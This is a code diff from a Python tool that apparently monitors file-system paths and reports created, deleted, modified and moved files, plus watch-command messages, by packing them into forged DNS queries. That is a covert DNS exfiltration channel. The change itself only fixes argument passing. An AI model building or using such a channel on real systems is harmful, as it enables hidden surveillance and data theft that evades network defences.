@@ -82,19 +82,19 @@ BLOCK_ENCRYPTION_HANDLER.read_key("data/fernet.key")
 
 # Defining the default event handling code for files.
 def on_created(event):
-    query = forge_dns_query(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Created: {event.src_path}", identification=MONITOR_IDENTIFICATION)
+    query = forge_dns_query(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Created: {event.src_path}", MONITOR_IDENTIFICATION)
     send_dns_query(query)
 
 def on_deleted(event):
-    query = forge_dns_query(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Deleted: {event.src_path}", identification=MONITOR_IDENTIFICATION)
+    query = forge_dns_query(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Deleted: {event.src_path}", MONITOR_IDENTIFICATION)
     send_dns_query(query)
 
 def on_modified(event):
-    query = forge_dns_query(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Modified: {event.src_path}", identification=MONITOR_IDENTIFICATION)
+    query = forge_dns_query(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Modified: {event.src_path}", MONITOR_IDENTIFICATION)
     send_dns_query(query)
 
 def on_moved(event):
-    query = forge_dns_query(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Moved: {event.src_path} --> {event.dest_path}", identification=MONITOR_IDENTIFICATION)
+    query = forge_dns_query(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Moved: {event.src_path} --> {event.dest_path}", MONITOR_IDENTIFICATION)
     send_dns_query(query)
 
 
@@ -219,12 +219,12 @@ def forge_dns_query(data: str, indentification: int):
 
 def execute_watch_command(path: str) -> bool:
     if not os.path.exists(path):
-        query = forge_dns_query(data=f"ERRORMSG: Path: {path} does not exist.", indentification=GENERAL_MSG_IDENTIFICATION)
+        query = forge_dns_query(f"ERRORMSG: Path: {path} does not exist.", GENERAL_MSG_IDENTIFICATION)
         send_dns_query(query)
         return False
     # Register the path to monitor.
     MONITOR.monitor(path)
-    query = forge_dns_query(data=f"Path '{path}' will be monitored.", indentification=GENERAL_MSG_IDENTIFICATION)
+    query = forge_dns_query(f"Path '{path}' will be monitored.", GENERAL_MSG_IDENTIFICATION)
     send_dns_query(query)
     return True
 
